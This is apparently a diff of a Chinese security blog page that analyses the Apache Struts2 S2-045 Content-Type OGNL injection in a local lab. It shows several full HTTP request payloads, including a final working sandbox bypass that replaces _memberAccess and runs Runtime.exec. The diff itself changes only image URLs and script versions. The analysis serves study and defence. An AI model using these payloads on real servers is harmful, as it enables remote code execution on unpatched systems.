 <p><strong>总结一下整个闭环</strong>：<code>SecurityMemberAccess</code> 是由 <code>OgnlUtil</code> 创建的，<code>OgnlUtil</code> 对象是可以获取的，赋值的黑名单绑定的是 <code>OgnlUtil</code> 里的字段，只要把 <code>OgnlUtil</code> 里的字段清空，<code>SecurityMemberAccess</code> 的黑名单就也没了，而 <code>OgnlUtil</code> 里刚好有 get 方法获取这个字段，<code>Set</code> 对象自带 <code>clear()</code> 方法，这样就成了一个闭环：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">OgnlUtil（容器里可获取）</span><br><span class="line">    → 创建 SecurityMemberAccess</span><br><span class="line">    → 把自己的 excludedPackageNames 引用传进去（同一块内存）</span><br><span class="line">    → OgnlUtil 暴露了 getExcludedPackageNames() 方法</span><br><span class="line">    → 拿到 Set 引用</span><br><span class="line">    → Set 自带 clear()</span><br><span class="line">    → 清空这块内存</span><br><span class="line">    → SecurityMemberAccess 里的黑名单也空了</span><br><span class="line">    → isPackageExcluded() 永远返回 false</span><br><span class="line">    → java.lang.Runtime 放行</span><br><span class="line">    → exec(&#x27;calc&#x27;) 执行</span><br><span class="line">→ 弹计算器</span><br></pre></td></tr></table></figure>
@@ -352,37 +352,37 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: %&#123;(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#ognlUtil.getExcludedPackageNamePatterns().clear()).(@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;))&#125;multipart/form-data</span><br></pre></td></tr></table></figure>
 
 <p>结果没有成功：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_58ge.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_58ge.png"></p>
 <p>看来分析错了，这是高版本的绕过机制，现在这个版本不适合，还有其他沙箱没有绕过。</p>
 <p>通过日志分析，还是识别并拦截了对 <code>java.lang.Runtime</code> 的调用：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_9x7r.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_9x7r.png"></p>
 <p>对比了一下没有 <code>clear()</code> 的报错日志，发现是一样的，也就是说 <code>clear()</code> 的作用没有效果。经过调试，一直在那三个检测函数上循环，然后找到了被检测的地方：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_cqd0.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_cqd0.png"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clazz 是 java.lang.Class</span><br></pre></td></tr></table></figure>
 
 <p>这个判断是<strong>硬编码</strong>的，不是从黑名单里读的，<code>clear()</code> 清空黑名单对这里没有任何影响。</p>
 <p>所以 <code>Runtime</code> 被拦截不是因为黑名单，而是因为访问 <code>Runtime</code> 时涉及到了 <code>Class</code> 对象，被这个硬编码的检测直接拦截了，<code>clear()</code> 根本解决不了这个问题。</p>
 <hr>
 <h3 id="第三步：尝试反射修改-allowStaticMethodAccess"><a href="#第三步：尝试反射修改-allowStaticMethodAccess" class="headerlink" title="第三步：尝试反射修改 allowStaticMethodAccess"></a>第三步：尝试反射修改 <code>allowStaticMethodAccess</code></h3><p>注意硬编码里有个条件 <code>!allowStaticMethodAccess</code>，如果 <code>allowStaticMethodAccess</code> 是 <code>true</code>，这个检测就不会拦截：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_l1ml.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_l1ml.png"></p>
 <p>跟进看这个字段在哪里定义，找 <code>public SecurityMemberAccess(boolean method)</code>，找到了 <code>OgnlUtil</code> 里创建对象：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_gf8j.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_gf8j.png"></p>
 <p>发现 <code>OgnlUtil</code> 里也只是：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> allowStaticMethodAccess;</span><br></pre></td></tr></table></figure>
 
 <p>没有定义 <code>false</code>，但是 Java 里 <code>boolean</code> 类型的字段如果没有显式赋值，默认就是 <code>false</code>：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_nw99.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_nw99.png"></p>
 <p>所以下一步就是想办法把 <code>allowStaticMethodAccess</code> 反射为 <code>true</code>。因为是私有的，需要反射修改：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(#f=#_memberAccess.getClass().getDeclaredField(<span class="string">&#x27;allowStaticMethodAccess&#x27;</span>)).</span><br><span class="line">(#f.setAccessible(<span class="literal">true</span>)).</span><br><span class="line">(#f.set(#_memberAccess,<span class="literal">true</span>))</span><br></pre></td></tr></table></figure>
 
 <p>构造完整 payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /upload HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Content-Type: %&#123;(#f=#_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;)).(#f.setAccessible(true)).(#f.set(#_memberAccess,true)).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;))&#125;multipart/form-data</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_mrco.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_mrco.png"></p>
 <p>依然没有成功，然后发现在 <code>isClassExcluded</code> 里被拦截了：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_j1j5.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_j1j5.png"></p>
 <p>查看黑名单发现：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_jq4s.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_jq4s.png"></p>
 <p><code>SecurityMemberAccess</code> 本身也在类黑名单里，所以对它用反射直接被拦截了。还是死循环：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对 _memberAccess 用反射</span><br><span class="line">    → isClassExcluded(SecurityMemberAccess)</span><br><span class="line">    → SecurityMemberAccess 在黑名单里</span><br><span class="line">    → 被拦截</span><br></pre></td></tr></table></figure>
 
@@ -392,18 +392,18 @@
 <p>因为这一整个检测都是在 <code>SecurityMemberAccess</code> 的 <code>isAccessible</code> 方法里的。还记得当时调试的代码是：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.getMemberAccess().isAccessible(...)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_svzj.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_svzj.png"></p>
 <p><code>context.getMemberAccess()</code> 返回的就是 <code>SecurityMemberAccess</code> 对象</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_99ml.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_99ml.png"></p>
 <p>然后再执行 <code>SecurityMemberAccess</code> 里的 <code>isAccessible</code> 检测方法。注意这里是通过字段 <code>_memberAccess</code> 获取的：</p>
 <p>那能不能直接反射改掉这个字段呢？</p>
 <p><code>SecurityMemberAccess</code> 是 Struts2 自定义的安全检测拦截对象，是通过继承 <code>DefaultMemberAccess</code> 实现的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_dpjc.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_dpjc.png"></p>
 <p>而 <code>DefaultMemberAccess</code> 是 OGNL 自带的：</p>
 <p><code>DefaultMemberAccess</code> 的 <code>isAccessible</code> 方法里没有任何拦截：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_6ta2.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_6ta2.png"></p>
 <p>找到创建的地方，在 <code>OgnlContext</code> 里：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_uxy1.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_uxy1.png"></p>
 <p>虽然传入的是 <code>false</code>，这就意味着：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// public  直接 true</span></span><br><span class="line"><span class="comment">// false，private 不行</span></span><br><span class="line"><span class="comment">// false，protected 不行</span></span><br></pre></td></tr></table></figure>
 
@@ -415,7 +415,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /upload HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Content-Type: %&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;))&#125;multipart/form-data</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
 
 <p><strong>成功弹出计算器！</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_51zk.png"></p>
+<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260512_164827_51zk.png"></p>
 <p>这意味着 <code>(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)</code> 没有被检测到才能执行。访问的是 <code>ognl.OgnlContext</code> 这个类，包名是 <code>ognl</code>，黑名单里有 <code>ognl</code>，按理说应该被拦截。但是这里访问的是<strong>静态字段</strong>不是方法，走的检测路径不一样，这个版本对静态字段的访问检测没有对静态方法那么严格，所以能拿到 <code>DEFAULT_MEMBER_ACCESS</code>，拿到之后替换 <code>_memberAccess</code>，后续所有检测全部失效，直接执行 <code>exec(&#39;calc&#39;)</code>。</p>
 <hr>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="漏洞触发链"><a href="#漏洞触发链" class="headerlink" title="漏洞触发链"></a>漏洞触发链</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Content-Type 包含 %&#123;...&#125; 且格式不合法</span><br><span class="line">    → Jakarta 解析器抛异常</span><br><span class="line">    → e.getMessage() 带出 Content-Type 值</span><br><span class="line">    → buildErrorMessage() 无过滤传递</span><br><span class="line">    → LocalizedTextUtil.findText()</span><br><span class="line">    → getDefaultMessage()</span><br><span class="line">    → TextParseUtil.translateVariables()</span><br><span class="line">    → OGNL 求值</span><br></pre></td></tr></table></figure>
@@ -875,7 +875,7 @@
 </script>
 
 <!-- required -->
-<script src="/js/main.js?v=mp2fxa0i" defer></script>
+<script src="/js/main.js?v=mp5bt8ij" defer></script>
 
 <script type="text/javascript">
   const applyTheme = (theme) => {
@@ -1139,7 +1139,7 @@
 <script src="/js/plugins/hotkeys.js"></script>
 
 <!-- Achievements / Card System -->
-<script src="/js/plugins/achievements.js?v=mp2fxa0i"></script>
+<script src="/js/plugins/achievements.js?v=mp5bt8ij"></script>
 
 <!-- Special Days - 节日彩蛋系统 -->
 <script src="/js/plugins/special-days.js"></script>
